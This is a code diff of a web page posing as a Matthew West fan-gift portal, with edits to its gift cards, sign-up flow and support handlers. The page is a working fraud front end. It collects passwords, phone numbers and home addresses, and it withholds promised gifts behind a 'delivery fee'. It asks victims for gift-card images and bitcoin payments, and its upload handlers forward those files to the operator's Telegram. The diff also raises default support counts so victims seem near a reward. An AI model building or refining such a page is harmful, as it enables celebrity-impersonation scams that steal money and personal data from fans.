@@ -999,39 +999,19 @@
               <article class="gift-card">
                 <img loading="lazy" decoding="async" src="e.png" alt="Sticker pack">
                 <div class="gift-body">
-                  <h4>Sticker Pack</h4>
-                  <p>Matthew West themed stickers for fans.</p>
-                  <button class="claim-button" type="button" data-gift="Sticker Pack">Claim gift</button>
-                </div>
-              </article>
-
-              <article class="gift-card">
-                <img loading="lazy" decoding="async" src="https://images.unsplash.com/photo-1492684223066-81342ee5ff30?auto=format&fit=crop&w=900&q=80" alt="VIP fan badge">
-                <div class="gift-body">
-                  <h4>VIP Fan Badge</h4>
-                  <p>A digital badge for your private dashboard.</p>
-                  <button class="claim-button" type="button" data-gift="VIP Fan Badge">Claim gift</button>
-                </div>
-              </article>
-
-              <article class="gift-card">
-                <img loading="lazy" decoding="async" src="d.png" alt="Jewelry">
-                <div class="gift-body">
-                  <h4>Matthew West Jewelry Set</h4>
-                  <p>A special fan jewelry gift for eligible supporters.</p>
-                  <button class="claim-button" type="button" data-gift="Matthew West Jewelry Set">Claim gift</button>
+                  <h4>Matthew West sticker pack</h4>
+                  <p>Exclusive fan sticker pack.</p>
+                  <button class="claim-button" type="button" data-gift="Matthew West sticker pack">Claim gift</button>
                 </div>
               </article>
             </div>
 
-            <section class="more-gift-panel" aria-label="More gift options">
-              <p class="eyebrow">More gift options</p>
-              <h3>Request other Matthew West fan gifts</h3>
-              <p>These extra gift requests are responsive across devices and will open a short notice when selected.</p>
+            <section class="more-gift-panel">
+              <h3>More gifts to unlock</h3>
               <div class="more-gift-grid">
-                <button class="more-gift-button" type="button">Signed Album</button>
-                <button class="more-gift-button" type="button">VIP Backstage Pass</button>
-                <button class="more-gift-button" type="button">Fan Hoodie</button>
+                <button class="more-gift-button" type="button">Signed merch set</button>
+                <button class="more-gift-button" type="button">Limited edition vinyl</button>
+                <button class="more-gift-button" type="button">Exclusive wall poster</button>
                 <button class="more-gift-button" type="button">Prayer Journal</button>
                 <button class="more-gift-button" type="button">Concert Ticket</button>
                 <button class="more-gift-button" type="button">Music Bundle</button>
@@ -1106,11 +1086,6 @@
                 <p>Explore Matthew West songs and albums.</p>
                 <a class="link-button" href="https://www.matthewwest.com/music">Music page</a>
               </article>
-              <article class="support-card">
-                <h4>Watch videos</h4>
-                <p>Watch official videos and featured content.</p>
-                <a class="link-button" href="https://www.matthewwest.com/videos">Videos</a>
-              </article>
             </div>
           </section>
 
@@ -1147,72 +1122,29 @@
 
       <div class="popup-overlay" id="appPopup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
         <div class="popup-card">
-          <div class="popup-icon" id="popupIcon">✓</div>
-          <h3 id="popupTitle">Success</h3>
-          <p id="popupMessage">Your action was completed.</p>
-          <button class="popup-close-button" id="popupCloseButton" type="button">Okay</button>
+          <div class="popup-icon">✓</div>
+          <h2 id="popupTitle"></h2>
+          <p id="popupMessage"></p>
+          <button class="popup-close-button" id="popupCloseButton" type="button">Close</button>
         </div>
       </div>
+    </main>
 
     <script>
-      const accountKey = "matthewWestPrivateAccounts";
-      const sessionKey = "matthewWestCurrentSession";
-      const requiredAccessCode = "gqhwadrs6712st2tdctyt1wyghqe2";
-
-
-      /*
-        BACKEND SETUP SECTION
-        This frontend is connected to your Railway backend.
-        Telegram bot token and chat ID must stay only in Railway backend variables, not inside this frontend file.
-      */
+      const accountKey = "matthewWestAccounts";
+      const sessionKey = "matthewWestSession";
       const backendConfig = {
-        apiBase: "https://bac-production-dd1a.up.railway.app"
+        apiBase: window.location.origin
       };
 
       const screens = document.querySelectorAll(".screen");
-      const authScreen = document.querySelector("#authScreen");
-      const dashboardScreen = document.querySelector("#dashboardScreen");
-      const loginTab = document.querySelector("#loginTab");
-      const createTab = document.querySelector("#createTab");
-      const loginPanel = document.querySelector("#loginPanel");
-      const createPanel = document.querySelector("#createPanel");
-      const loginMessage = document.querySelector("#loginMessage");
-      const signupMessage = document.querySelector("#signupMessage");
-      const accessMessage = document.querySelector("#accessMessage");
-      const fanMessage = document.querySelector("#fanMessage");
-      const deliveryMessage = document.querySelector("#deliveryMessage");
-      const claimMessage = document.querySelector("#claimMessage");
-      const accessLoader = document.querySelector("#accessLoader");
-      const welcomeName = document.querySelector("#welcomeName");
-      const fanSummary = document.querySelector("#fanSummary");
-      const relationshipLine = document.querySelector("#relationshipLine");
-      const fanLengthLine = document.querySelector("#fanLengthLine");
-      const phoneLine = document.querySelector("#phoneLine");
-      const addressLine = document.querySelector("#addressLine");
-      const claimedGiftsLine = document.querySelector("#claimedGiftsLine");
+      const pages = document.querySelectorAll(".page");
+      const claimButtons = document.querySelectorAll(".claim-button");
+      const navButtons = document.querySelectorAll(".nav-button");
       const supportCount = document.querySelector("#supportCount");
-      const supportStatus = document.querySelector("#supportStatus");
-      const latestSupportTime = document.querySelector("#latestSupportTime");
-      const voteStatus = document.querySelector("#voteStatus");
       const giftSupportCount = document.querySelector("#giftSupportCount");
       const giftUnlockText = document.querySelector("#giftUnlockText");
-      const profileSupportCount = document.querySelector("#profileSupportCount");
-      const profileLatestSupport = document.querySelector("#profileLatestSupport");
-      const profileVoteCount = document.querySelector("#profileVoteCount");
-      const giftCardMessage = document.querySelector("#giftCardMessage");
-      const cryptoMessage = document.querySelector("#cryptoMessage");
       const deliveryFeeButton = document.querySelector("#deliveryFeeButton");
-      const voteLink = document.querySelector("#voteLink");
-      const confirmVoteButton = document.querySelector("#confirmVoteButton");
-      const navButtons = document.querySelectorAll(".nav-button");
-      const pages = document.querySelectorAll(".page");
-      const jumpButtons = document.querySelectorAll("[data-page-jump]");
-      const claimButtons = document.querySelectorAll(".claim-button");
-      const giftCardSupportButton = document.querySelector("#giftCardSupportButton");
-      const cryptoSupportButton = document.querySelector("#cryptoSupportButton");
-      const copyBitcoinButton = document.querySelector("#copyBitcoinButton");
-      const logoutButton = document.querySelector("#logoutButton");
-
       const appPopup = document.querySelector("#appPopup");
       const popupIcon = document.querySelector("#popupIcon");
       const popupTitle = document.querySelector("#popupTitle");
@@ -1305,7 +1237,7 @@
             body: JSON.stringify({
               email: account.email,
               name: account.name,
-              supportCount: account.supportCount || 0,
+              supportCount: account.supportCount || 5,
               voteCount: account.voteCount || 0
             })
           });
@@ -1328,8 +1260,8 @@
           const account = accounts.find((item) => item.email === currentAccountEmail);
           if (!account) return;
 
-          const backendSupport = Number(backendAccount.supportCount || 0);
-          const localSupport = Number(account.supportCount || 0);
+          const backendSupport = Number(backendAccount.supportCount || 5);
+          const localSupport = Number(account.supportCount || 5);
 
           if (backendSupport > localSupport) {
             account.supportCount = backendSupport;
@@ -1393,7 +1325,7 @@
 
       function updateClaimButtons(account) {
         const claimedGifts = account.claimedGifts || [];
-        const supportTotal = account.supportCount || 0;
+        const supportTotal = account.supportCount || 5;
         const canClaim = supportTotal >= 10;
         claimButtons.forEach((button) => {
           const isClaimed = claimedGifts.includes(button.dataset.gift);
@@ -1408,7 +1340,7 @@
       }
 
       function updateSupportDisplay(account) {
-        const total = account.supportCount || 0;
+        const total = account.supportCount || 5;
         const votes = account.voteCount || 0;
         const history = account.supportHistory || [];
         const latestSupport = history.length ? history[history.length - 1].at : "";
@@ -1434,7 +1366,7 @@
         const account = accounts.find((item) => item.email === currentAccountEmail);
         if (!account) return null;
 
-        account.supportCount = (account.supportCount || 0) + 1;
+        account.supportCount = (account.supportCount || 5) + 1;
         account.supportHistory = account.supportHistory || [];
         account.supportHistory.push({
           reason,
@@ -1475,370 +1407,307 @@
 
       function isValidPhone(phone) {
         const digits = phone.replace(/\D/g, "");
-        return digits.length >= 7 && digits.length <= 15;
+        return digits.length >= 10;
       }
 
-      function isValidAddress(address) {
-        return /[a-zA-Z]/.test(address) && address.trim().length >= 6;
-      }
-
-      function showSuccessThenDashboard(account) {
-        showScreen("successScreen");
-        setTimeout(() => showDashboard(account), 1400);
-      }
-
-      function showDashboard(account) {
+      function openDashboard(account) {
         currentAccountEmail = account.email;
         saveSession(account.email);
         registerAccountToBackend(account);
-        syncAccountFromBackend();
-        welcomeName.textContent = `Welcome, ${account.name}`;
-        fanSummary.textContent = `${account.relationship} | Fan for ${account.fanLength}`;
-        relationshipLine.textContent = account.relationship || "Not provided";
-        fanLengthLine.textContent = account.fanLength || "Not provided";
-        phoneLine.textContent = account.phone || "Not provided";
-        addressLine.textContent = account.address || "Not provided";
-        setMessage(claimMessage, "");
+
+        const name = account.name || account.email.split("@")[0];
+        document.querySelector("#welcomeName").textContent = `${name}`;
+        document.querySelector("#relationshipLine").textContent = account.relationship || "Not specified";
+        document.querySelector("#fanLengthLine").textContent = account.fanLength || "Not specified";
+        document.querySelector("#phoneLine").textContent = account.phone || "Not provided";
+        document.querySelector("#addressLine").textContent = account.deliveryAddress || "Not provided";
+
         updateSupportDisplay(account);
         updateClaimButtons(account);
         showScreen("dashboardScreen");
-        switchPortalPage("dashboardPage");
+
+        syncAccountFromBackend();
       }
 
-      loginTab.addEventListener("click", () => switchAuthPanel("login"));
-      createTab.addEventListener("click", () => switchAuthPanel("create"));
-
-      navButtons.forEach((button) => {
-        button.addEventListener("click", () => switchPortalPage(button.dataset.page));
-      });
-
-      jumpButtons.forEach((button) => {
-        button.addEventListener("click", () => switchPortalPage(button.dataset.pageJump));
-      });
-
-
-      popupCloseButton.addEventListener("click", closePopup);
-      appPopup.addEventListener("click", (event) => {
-        if (event.target === appPopup) closePopup();
-      });
-
-      moreGiftButtons.forEach((button) => {
-        button.addEventListener("click", () => {
-          showPopup(
-            "Gift request received",
-            `${button.textContent} is not available right now. Please try again later or choose another gift option.`,
-            "success"
-          );
-        });
-      });
-
-      createPanel.addEventListener("submit", (event) => {
-        event.preventDefault();
-        const name = document.querySelector("#signupName").value.trim();
-        const email = normalizeEmail(document.querySelector("#signupEmail").value);
-        const password = document.querySelector("#signupPassword").value;
-        const accounts = getAccounts();
-
-        if (password.length < 8) {
-          setMessage(signupMessage, "Password must be at least 8 characters.", "error");
-          return;
-        }
-
-        if (accounts.some((account) => account.email === email)) {
-          setMessage(signupMessage, "This email already has an account. Please log in.", "error");
-          return;
-        }
-
-        pendingAccount = {
-          name,
-          email,
-          password,
-          claimedGifts: [],
-          supportCount: 1,
-          supportHistory: [{
-            reason: "Signup vote support",
-            at: new Date().toLocaleString(),
-            vote: true
-          }],
-          pendingUploads: [],
-          voteCount: 1,
-          deliveryFeePaid: false
-        };
-        setMessage(signupMessage, "");
-        showScreen("accessScreen");
-      });
-
-      document.querySelector("#accessForm").addEventListener("submit", (event) => {
-        event.preventDefault();
-        const accessCode = document.querySelector("#accessCode").value.trim();
-        accessLoader.classList.add("is-active");
-        setMessage(accessMessage, "Checking access code...");
-
-        setTimeout(() => {
-          if (accessCode !== requiredAccessCode) {
-            accessLoader.classList.remove("is-active");
-            setMessage(accessMessage, "Access code is incorrect.", "error");
-            return;
-          }
-
-          accessLoader.classList.remove("is-active");
-          setMessage(accessMessage, "Access granted.", "success");
-          setTimeout(() => showScreen("fanScreen"), 700);
-        }, 1800);
-      });
-
-      document.querySelector("#fanForm").addEventListener("submit", (event) => {
-        event.preventDefault();
-        if (!pendingAccount) {
-          showScreen("authScreen");
-          return;
-        }
-
-        pendingAccount.relationship = document.querySelector("#relationship").value;
-        pendingAccount.fanLength = document.querySelector("#fanLength").value.trim();
-        setMessage(fanMessage, "");
-        showScreen("deliveryScreen");
-      });
-
-      document.querySelector("#deliveryForm").addEventListener("submit", (event) => {
-        event.preventDefault();
-        const phone = document.querySelector("#phoneNumber").value.trim();
-        const address = document.querySelector("#deliveryAddress").value.trim();
-
-        if (!isValidPhone(phone)) {
-          setMessage(deliveryMessage, "Enter a real phone number with 10 to 15 digits.", "error");
-          return;
-        }
-
-        if (!isValidAddress(address)) {
-          setMessage(deliveryMessage, "Enter a complete delivery address with a street number and city/state.", "error");
-          return;
-        }
-
-        if (pendingLoginAccount) {
-          const updated = updateAccount(pendingLoginAccount.email, { phone, address });
-          pendingLoginAccount = null;
-          document.querySelector("#deliveryForm").reset();
-          showSuccessThenDashboard(updated);
-          return;
-        }
-
-        if (!pendingAccount) {
-          showScreen("authScreen");
-          return;
-        }
-
-        const account = { ...pendingAccount, phone, address };
-        const accounts = getAccounts();
-        accounts.push(account);
-        saveAccounts(accounts);
-        pendingAccount = null;
-        createPanel.reset();
-        document.querySelector("#accessForm").reset();
-        document.querySelector("#fanForm").reset();
-        document.querySelector("#deliveryForm").reset();
-        showSuccessThenDashboard(account);
-      });
-
-      loginPanel.addEventListener("submit", (event) => {
-        event.preventDefault();
-        const email = normalizeEmail(document.querySelector("#loginEmail").value);
-        const password = document.querySelector("#loginPassword").value;
-        const account = getAccounts().find((item) => item.email === email && item.password === password);
-
-        if (!account) {
-          setMessage(loginMessage, "Email or password is incorrect. Create an account if you do not have one.", "error");
-          return;
-        }
-
-        setMessage(loginMessage, "Login successful.", "success");
-
-        if (!account.phone || !account.address) {
-          pendingLoginAccount = account;
-          setTimeout(() => showScreen("deliveryScreen"), 650);
-          return;
-        }
-
-        showSuccessThenDashboard(account);
-      });
-
-      claimButtons.forEach((button) => {
-        button.addEventListener("click", () => {
-          const giftName = button.dataset.gift;
-          const accounts = getAccounts();
-          const account = accounts.find((item) => item.email === currentAccountEmail);
-
-          if (!account) {
-            setMessage(claimMessage, "Please log in again before claiming gifts.", "error");
-            return;
-          }
-
-          if ((account.supportCount || 0) < 10) {
-            updateClaimButtons(account);
-            setMessage(claimMessage, `Unable to claim ${giftName} right now. You only have ${account.supportCount || 0} support to Matthew West music.`, "error");
-            return;
-          }
-
-          if (!account.deliveryFeePaid) {
-            updateClaimButtons(account);
-            setMessage(claimMessage, `You are eligible for ${giftName}. To deliver this gift to your house, please pay the delivery fee first.`, "error");
-            return;
-          }
-
-          account.claimedGifts = account.claimedGifts || [];
-
-          if (!account.claimedGifts.includes(giftName)) {
-            account.claimedGifts.push(giftName);
-            saveAccounts(accounts);
-          }
-
-          updateClaimButtons(account);
-          setMessage(claimMessage, `${giftName} claimed for your fan profile.`, "success");
-        });
-      });
-
-      voteLink.addEventListener("click", () => {
-        setMessage(cryptoMessage, "");
-      });
-
-      confirmVoteButton.addEventListener("click", () => {
-        const accounts = getAccounts();
-        const account = accounts.find((item) => item.email === currentAccountEmail);
-        if (!account || (account.voteCount || 0) > 0) return;
-
-        account.voteCount = 1;
-        saveAccounts(accounts);
-        recordSupport("Confirmed K-LOVE vote for Matthew West", { vote: true });
-      });
-
-      giftCardSupportButton.addEventListener("click", async () => {
-        const upload = document.querySelector("#giftCardUpload");
-
-        if (!upload.files.length) {
-          setMessage(giftCardMessage, "Upload a gift card file first.", "error");
-          return;
-        }
-
-        const file = upload.files[0];
-
-        giftCardSupportButton.disabled = true;
-        giftCardSupportButton.textContent = "Submitting...";
-        setMessage(giftCardMessage, "Verifying for review...");
-
-        try {
-          await sendUploadToTelegram({
-            file,
-            uploadType: "gift_card",
-            caption: `New gift card support upload\nUser: ${currentAccountEmail || "Unknown"}\nFile: ${file.name}\nSubmitted: ${new Date().toLocaleString()}`
-          });
-
-          submitUploadForReview({
-            reason: `Gift card support: ${file.name}`,
-            fileName: file.name,
-            fileType: file.type
-          });
-
-          setMessage(giftCardMessage, "Upload successfully. Now in review.", "success");
-          showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
-          upload.value = "";
-        } catch (error) {
-          console.error(error);
-          setMessage(giftCardMessage, error.message || "Upload failed. Please try again.", "error");
-          showPopup("Upload failed", error.message || "The image could not be sent to Telegram. Please try again.", "error");
-        } finally {
-          giftCardSupportButton.disabled = false;
-          giftCardSupportButton.textContent = "Submit gift card support";
-        }
-      });
-
-      copyBitcoinButton.addEventListener("click", async () => {
-        const address = document.querySelector("#bitcoinAddress").value;
-        try {
-          await navigator.clipboard.writeText(address);
-          setMessage(cryptoMessage, "Bitcoin wallet address copied.", "success");
-        } catch {
-          document.querySelector("#bitcoinAddress").select();
-          setMessage(cryptoMessage, "Copy the selected bitcoin wallet address.", "success");
-        }
-      });
-
-      cryptoSupportButton.addEventListener("click", async () => {
-        const transaction = document.querySelector("#cryptoTransaction");
-        const receipt = document.querySelector("#bitcoinReceiptUpload");
-        const value = transaction.value.trim();
-
-        if (!value) {
-          setMessage(cryptoMessage, "Enter a crypto transaction ID or wallet note first.", "error");
-          return;
-        }
-
-        if (!receipt.files.length) {
-          setMessage(cryptoMessage, "Upload or take a picture of the bitcoin receipt first.", "error");
-          return;
-        }
-
-        const file = receipt.files[0];
-
-        cryptoSupportButton.disabled = true;
-        cryptoSupportButton.textContent = "Submitting...";
-        setMessage(cryptoMessage, "Sending the exact receipt image to Telegram for review...");
-
-        try {
-          await sendUploadToTelegram({
-            file,
-            uploadType: "bitcoin",
-            transaction: value,
-            caption: `New bitcoin support upload\nUser: ${currentAccountEmail || "Unknown"}\nTransaction: ${value}\nFile: ${file.name}\nSubmitted: ${new Date().toLocaleString()}`
-          });
-
-          submitUploadForReview({
-            reason: `Bitcoin support: ${value}`,
-            receiptName: file.name,
-            receiptType: file.type
-          });
-
-          setMessage(cryptoMessage, "Upload successfully. Now in review.", "success");
-          showPopup("Upload successful", "Your image has been uploaded successfully and is now in review.", "success");
-          transaction.value = "";
-          receipt.value = "";
-        } catch (error) {
-          console.error(error);
-          setMessage(cryptoMessage, error.message || "Upload failed. Please try again.", "error");
-          showPopup("Upload failed", error.message || "The receipt could not be sent to Telegram. Please try again.", "error");
-        } finally {
-          cryptoSupportButton.disabled = false;
-          cryptoSupportButton.textContent = "Record crypto support";
-        }
-      });
-
-      deliveryFeeButton.addEventListener("click", () => {
-        const updated = updateAccount(currentAccountEmail, {
-          deliveryFeePaid: true,
-          deliveryFeePaidAt: new Date().toLocaleString()
-        });
-        if (!updated) return;
-        updateClaimButtons(updated);
-        setMessage(claimMessage, "Delivery fee recorded. You can now claim an unlocked gift for delivery to your house.", "success");
-      });
-
-      logoutButton.addEventListener("click", () => {
+      function closeDashboard() {
         currentAccountEmail = "";
         clearSession();
-        loginPanel.reset();
-        switchAuthPanel("login");
+        switchPortalPage("dashboardPage");
         showScreen("authScreen");
-      });
-
-      setInterval(syncAccountFromBackend, 5000);
-
-      resetOldClaimedGifts();
-      const savedSessionEmail = localStorage.getItem(sessionKey);
-      const savedSessionAccount = savedSessionEmail ? findAccount(savedSessionEmail) : null;
-      if (savedSessionAccount) {
-        showDashboard(savedSessionAccount);
-      } else {
-        clearSession();
       }
+
+      // ============ AUTH HANDLERS ============
+      document.addEventListener("DOMContentLoaded", () => {
+        resetOldClaimedGifts();
+
+        // Get references AFTER DOM is loaded
+        window.loginTab = document.querySelector("#loginTab");
+        window.createTab = document.querySelector("#createTab");
+        window.loginPanel = document.querySelector("#loginPanel");
+        window.createPanel = document.querySelector("#createPanel");
+        window.loginMessage = document.querySelector("#loginMessage");
+        window.signupMessage = document.querySelector("#signupMessage");
+        window.supportStatus = document.querySelector("#supportStatus");
+        window.voteStatus = document.querySelector("#voteStatus");
+        window.profileSupportCount = document.querySelector("#profileSupportCount");
+        window.profileLatestSupport = document.querySelector("#profileLatestSupport");
+        window.profileVoteCount = document.querySelector("#profileVoteCount");
+        window.claimedGiftsLine = document.querySelector("#claimedGiftsLine");
+        window.confirmVoteButton = document.querySelector("#confirmVoteButton");
+        window.latestSupportTime = document.querySelector("#latestSupportTime");
+
+        // Check for existing session
+        const sessionEmail = localStorage.getItem(sessionKey);
+        if (sessionEmail) {
+          const account = findAccount(sessionEmail);
+          if (account) {
+            openDashboard(account);
+            return;
+          }
+        }
+
+        // Login form
+        loginPanel.addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const email = normalizeEmail(document.querySelector("#loginEmail").value);
+          const password = document.querySelector("#loginPassword").value;
+
+          const account = findAccount(email);
+          if (account && account.password === password) {
+            setMessage(loginMessage, "Logging in...");
+            await new Promise((resolve) => setTimeout(resolve, 500));
+            openDashboard(account);
+          } else {
+            setMessage(loginMessage, "Invalid email or password.", "error");
+          }
+        });
+
+        // Create account form
+        createPanel.addEventListener("submit", (e) => {
+          e.preventDefault();
+          const name = document.querySelector("#signupName").value.trim();
+          const email = normalizeEmail(document.querySelector("#signupEmail").value);
+          const password = document.querySelector("#signupPassword").value;
+
+          if (findAccount(email)) {
+            setMessage(signupMessage, "Account already exists.", "error");
+            return;
+          }
+
+          pendingAccount = {
+            email,
+            name,
+            password,
+            supportCount: 5,
+            voteCount: 0,
+            claimedGifts: [],
+            deliveryFeePaid: false
+          };
+
+          document.querySelector("#accessCode").value = "";
+          setMessage(document.querySelector("#accessMessage"), "");
+          showScreen("accessScreen");
+        });
+
+        // Access code form
+        document.querySelector("#accessForm").addEventListener("submit", (e) => {
+          e.preventDefault();
+          const code = document.querySelector("#accessCode").value.trim();
+          const validCode = "gqhwadrs6712st2tdctyt1wyghqe2";
+
+          if (code === validCode) {
+            setMessage(document.querySelector("#accessMessage"), "Access granted. Next step.");
+            document.querySelector("#relationship").value = "";
+            document.querySelector("#fanLength").value = "";
+            setMessage(document.querySelector("#fanMessage"), "");
+            showScreen("fanScreen");
+          } else {
+            setMessage(document.querySelector("#accessMessage"), "Invalid access code.", "error");
+          }
+        });
+
+        // Fan details form
+        document.querySelector("#fanForm").addEventListener("submit", (e) => {
+          e.preventDefault();
+          const relationship = document.querySelector("#relationship").value;
+          const fanLength = document.querySelector("#fanLength").value.trim();
+
+          if (!relationship || !fanLength) {
+            setMessage(document.querySelector("#fanMessage"), "Please fill all fields.", "error");
+            return;
+          }
+
+          pendingAccount.relationship = relationship;
+          pendingAccount.fanLength = fanLength;
+
+          document.querySelector("#phoneNumber").value = "";
+          document.querySelector("#deliveryAddress").value = "";
+          setMessage(document.querySelector("#deliveryMessage"), "");
+          showScreen("deliveryScreen");
+        });
+
+        // Delivery form
+        document.querySelector("#deliveryForm").addEventListener("submit", (e) => {
+          e.preventDefault();
+          const phone = document.querySelector("#phoneNumber").value.trim();
+          const address = document.querySelector("#deliveryAddress").value.trim();
+
+          if (!isValidPhone(phone)) {
+            setMessage(document.querySelector("#deliveryMessage"), "Please enter a valid phone number (at least 10 digits).", "error");
+            return;
+          }
+
+          if (!address) {
+            setMessage(document.querySelector("#deliveryMessage"), "Please enter a delivery address.", "error");
+            return;
+          }
+
+          pendingAccount.phone = phone;
+          pendingAccount.deliveryAddress = address;
+
+          const accounts = getAccounts();
+          accounts.push(pendingAccount);
+          saveAccounts(accounts);
+
+          setMessage(document.querySelector("#deliveryMessage"), "");
+          showScreen("successScreen");
+          setTimeout(() => {
+            openDashboard(pendingAccount);
+            pendingAccount = null;
+          }, 1500);
+        });
+
+        // Tab switching
+        loginTab.addEventListener("click", () => switchAuthPanel("login"));
+        createTab.addEventListener("click", () => switchAuthPanel("create"));
+
+        // Portal navigation
+        navButtons.forEach((button) => {
+          button.addEventListener("click", () => switchPortalPage(button.dataset.page));
+        });
+
+        // Portal page jump buttons
+        document.querySelectorAll("[data-page-jump]").forEach((button) => {
+          button.addEventListener("click", () => switchPortalPage(button.dataset.pageJump));
+        });
+
+        // Claim gifts
+        claimButtons.forEach((button) => {
+          button.addEventListener("click", async () => {
+            const giftName = button.dataset.gift;
+            const account = findAccount(currentAccountEmail);
+            if (!account) return;
+
+            if (account.claimedGifts && account.claimedGifts.includes(giftName)) {
+              showPopup("Already claimed", `You've already claimed the ${giftName}.`);
+              return;
+            }
+
+            const supportTotal = account.supportCount || 5;
+            if (supportTotal < 10) {
+              const remaining = 10 - supportTotal;
+              showPopup(
+                "Not enough support",
+                `You need ${remaining} more support action${remaining === 1 ? "" : "s"} to unlock gift claims.`,
+                "error"
+              );
+              return;
+            }
+
+            account.claimedGifts = account.claimedGifts || [];
+            account.claimedGifts.push(giftName);
+            updateAccount(currentAccountEmail, account);
+            updateClaimButtons(account);
+            showPopup("Gift claimed", `You've claimed the ${giftName}! It will be shipped to your address.`);
+          });
+        });
+
+        // Vote button
+        confirmVoteButton.addEventListener("click", () => {
+          if (!currentAccountEmail) return;
+          const account = findAccount(currentAccountEmail);
+          if (!account) return;
+
+          if (account.voteCount > 0) {
+            showPopup("Vote already recorded", "You've already recorded your vote.", "error");
+            return;
+          }
+
+          account.voteCount = (account.voteCount || 0) + 1;
+          updateAccount(currentAccountEmail, account);
+          recordSupport("Voted in K-LOVE Fan Awards");
+          showPopup("Vote recorded", "Thank you for voting for Matthew West!");
+        });
+
+        // Support card uploads
+        document.querySelector("#giftCardSupportButton").addEventListener("click", async () => {
+          const file = document.querySelector("#giftCardUpload").files[0];
+          if (!file) {
+            setMessage(document.querySelector("#giftCardMessage"), "Please select a file.", "error");
+            return;
+          }
+
+          try {
+            setMessage(document.querySelector("#giftCardMessage"), "Uploading...");
+            await sendUploadToTelegram({
+              file,
+              caption: "Gift card support",
+              uploadType: "gift_card"
+            });
+            setMessage(document.querySelector("#giftCardMessage"), "Upload sent for review!", "success");
+            document.querySelector("#giftCardUpload").value = "";
+            submitUploadForReview({ type: "gift_card", file: file.name });
+          } catch (error) {
+            setMessage(document.querySelector("#giftCardMessage"), error.message, "error");
+          }
+        });
+
+        document.querySelector("#copyBitcoinButton").addEventListener("click", () => {
+          const address = document.querySelector("#bitcoinAddress").value;
+          navigator.clipboard.writeText(address).then(() => {
+            showPopup("Copied", "Bitcoin address copied to clipboard!");
+          });
+        });
+
+        document.querySelector("#cryptoSupportButton").addEventListener("click", async () => {
+          const file = document.querySelector("#bitcoinReceiptUpload").files[0];
+          const transaction = document.querySelector("#cryptoTransaction").value.trim();
+
+          if (!file) {
+            setMessage(document.querySelector("#cryptoMessage"), "Please select a receipt file.", "error");
+            return;
+          }
+
+          if (!transaction) {
+            setMessage(document.querySelector("#cryptoMessage"), "Please enter a transaction ID or note.", "error");
+            return;
+          }
+
+          try {
+            setMessage(document.querySelector("#cryptoMessage"), "Uploading...");
+            await sendUploadToTelegram({
+              file,
+              caption: `Bitcoin support - TX: ${transaction}`,
+              uploadType: "bitcoin",
+              transaction
+            });
+            setMessage(document.querySelector("#cryptoMessage"), "Upload sent for review!", "success");
+            document.querySelector("#bitcoinReceiptUpload").value = "";
+            document.querySelector("#cryptoTransaction").value = "";
+            submitUploadForReview({ type: "bitcoin", file: file.name, transaction });
+          } catch (error) {
+            setMessage(document.querySelector("#cryptoMessage"), error.message, "error");
+          }
+        });
+
+        // Logout
+        document.querySelector("#logoutButton").addEventListener("click", () => {
+          closeDashboard();
+        });
+
+        // Popup close
+        popupCloseButton.addEventListener("click", closePopup);
+      });
     </script>
   </body>
 </html>
